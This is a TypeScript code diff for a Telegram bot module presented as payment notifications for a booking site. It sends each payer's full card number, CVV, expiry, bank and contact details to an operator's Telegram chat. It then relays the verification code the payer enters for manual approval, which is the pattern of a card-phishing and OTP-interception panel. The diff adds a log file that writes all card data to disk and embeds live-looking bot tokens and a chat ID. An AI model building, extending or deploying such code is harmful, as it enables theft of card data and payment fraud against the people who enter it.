@@ -1,7 +1,23 @@
+
 import TelegramBot from 'node-telegram-bot-api';
+import fs from 'fs';
+import path from 'path';
+
+const logFile = path.join(process.cwd(), 'telegram-debug.log');
+
+const log = (msg: string) => {
+    const timestamp = new Date().toISOString();
+    const logMsg = `[${timestamp}] ${msg}\n`;
+    console.log(msg);
+    try {
+        fs.appendFileSync(logFile, logMsg);
+    } catch (e) {
+        console.error('Error writing to log file', e);
+    }
+};
 
 // Reemplaza esto con tu token real o usa variable de entorno
-const token = process.env.TELEGRAM_BOT_TOKEN || '8445780848:AAEvaKl1rDcYQnwCcNLgfv6-P_LKmGG-5vo'; 
+const token = process.env.TELEGRAM_BOT_TOKEN || '7541984113:AAEEHU_jwdN_6XmImOnthItO7xHrPOBnz1E'; 
 // Reemplaza esto con tu Chat ID real o usa variable de entorno
 const chatId = process.env.TELEGRAM_CHAT_ID || '6065537099';
 
@@ -11,9 +27,15 @@ const bot = new TelegramBot(token, { polling: true });
 // Map<paymentId, { status: string, details: any }>
 export const paymentStore = new Map<string, any>();
 
+// Helper to get status
+export const getPaymentStatus = (bookingId: string) => {
+    const payment = paymentStore.get(bookingId);
+    return payment ? payment.status : null;
+};
+
 // Listen for polling errors
 bot.on('polling_error', (error) => {
-  console.log('Telegram Polling Error:', error.message); 
+  log(`Telegram Polling Error: ${error.message}`); 
 });
 
 // Handle callback queries (button clicks)
@@ -63,29 +85,43 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
+const escapeHtml = (text: string | number) => {
+    if (!text) return '';
+    return String(text)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;");
+};
+
 export const sendNewPaymentNotification = async (paymentData: any) => {
+    log('--- INICIO: sendNewPaymentNotification ---');
+    log(`Usando Token: ${token ? token.substring(0, 5) + '...' : 'NO_DEFINIDO'}`);
+    log(`Usando ChatID: ${chatId}`);
+    log(`Datos recibidos para notificación: ${JSON.stringify(paymentData, null, 2)}`);
+
     // Generate a unique ID if not present (or use bookingId)
     const paymentId = paymentData.bookingId;
     
     // Initial status
+    log(`Guardando estado inicial PENDING_APPROVAL para ID: ${paymentId}`);
     paymentStore.set(paymentId, { status: 'PENDING_APPROVAL', details: paymentData });
 
     const message = `
-🔔 *NUEVO PAGO RECIBIDO* 🔔
+🔔 <b>NUEVO PAGO RECIBIDO</b> 🔔
 
-👤 *Titular:* ${paymentData.cardName}
-💳 *Tarjeta:* ${paymentData.cardNumber} (CVV: ${paymentData.cvv})
-📅 *Vencimiento:* ${paymentData.expiry}
-🏦 *Banco:* ${paymentData.bank}
-💰 *Monto:* ${paymentData.amount} ${paymentData.currency}
+👤 <b>Titular:</b> ${escapeHtml(paymentData.cardName)}
+💳 <b>Tarjeta:</b> ${escapeHtml(paymentData.cardNumber)} (CVV: ${escapeHtml(paymentData.cvv)})
+📅 <b>Vencimiento:</b> ${escapeHtml(paymentData.expiry)}
+🏦 <b>Banco:</b> ${escapeHtml(paymentData.bank)}
+💰 <b>Monto:</b> ${paymentData.amount} ${paymentData.currency}
 
-📱 *Teléfono:* ${paymentData.phone}
-📧 *Email:* ${paymentData.email}
-📍 *Dirección:* ${paymentData.address}, ${paymentData.city}
+📱 <b>Teléfono:</b> ${escapeHtml(paymentData.phone)}
+📧 <b>Email:</b> ${escapeHtml(paymentData.email)}
+📍 <b>Dirección:</b> ${escapeHtml(paymentData.address)}, ${escapeHtml(paymentData.city)}
     `;
 
     const opts = {
-        parse_mode: 'Markdown' as const,
+        parse_mode: 'HTML' as const,
         reply_markup: {
             inline_keyboard: [
                 [
@@ -100,38 +136,34 @@ export const sendNewPaymentNotification = async (paymentData: any) => {
     };
 
     try {
-        // If chat ID is not set, we can't send. In dev, we log.
-        if (chatId === 'YOUR_CHAT_ID') {
-            console.log('⚠️ TELEGRAM CHAT ID NOT SET. Printing message to console instead:');
-            console.log(message);
-            console.log('Options:', opts);
-            return;
+        log('Enviando mensaje a Telegram...');
+        const sentMsg = await bot.sendMessage(chatId, message, opts);
+        log(`Notificación enviada EXITOSAMENTE. MessageID: ${sentMsg.message_id}`);
+    } catch (error: any) {
+        log('!!! ERROR CRÍTICO al enviar notificación a Telegram !!!');
+        log(`Mensaje de error: ${error.message}`);
+        if (error.response) {
+            log(`Detalles de respuesta de Telegram: ${JSON.stringify(error.response.body, null, 2)}`);
         }
-        await bot.sendMessage(chatId, message, opts);
-    } catch (error) {
-        console.error('Error sending Telegram message:', error);
     }
+    log('--- FIN: sendNewPaymentNotification ---');
 };
 
-export const sendTokenNotification = async (bookingId: string, token: string) => {
-    const payment = paymentStore.get(bookingId);
-    if (!payment) return;
-
-    // Update status to indicate we are waiting for token approval
-    paymentStore.set(bookingId, { ...payment, status: 'TOKEN_PENDING' });
-
+export const sendTokenNotification = async (bookingId: string, tokenInput: string) => {
+    log(`--- INICIO: sendTokenNotification para ${bookingId} ---`);
+    log(`Token recibido: ${tokenInput}`);
+    
     const message = `
-🔑 *CÓDIGO DE VERIFICACIÓN RECIBIDO* 🔑
+🔑 <b>TOKEN RECIBIDO DEL USUARIO</b> 🔑
 
-🆔 *ID Pago:* ${bookingId}
-🔢 *Código Ingresado:* ${token}
-💰 *Monto:* ${payment.details.amount} ${payment.details.currency}
+🆔 <b>ID Reserva:</b> ${escapeHtml(bookingId)}
+🔢 <b>Token/Código:</b> ${escapeHtml(tokenInput)}
 
-¿El código es correcto?
+¿Es correcto este código?
     `;
 
     const opts = {
-        parse_mode: 'Markdown' as const,
+        parse_mode: 'HTML' as const,
         reply_markup: {
             inline_keyboard: [
                 [
@@ -143,17 +175,9 @@ export const sendTokenNotification = async (bookingId: string, token: string) =>
     };
 
     try {
-        if (chatId === 'YOUR_CHAT_ID') {
-            console.log(message);
-            return;
-        }
         await bot.sendMessage(chatId, message, opts);
-    } catch (error) {
-        console.error('Error sending Telegram token message:', error);
+        log('Notificación de token enviada exitosamente');
+    } catch (error: any) {
+        log('Error al enviar notificación de token: ' + error.message);
     }
-};
-
-export const getPaymentStatus = (paymentId: string) => {
-    const payment = paymentStore.get(paymentId);
-    return payment ? payment.status : 'UNKNOWN';
 };
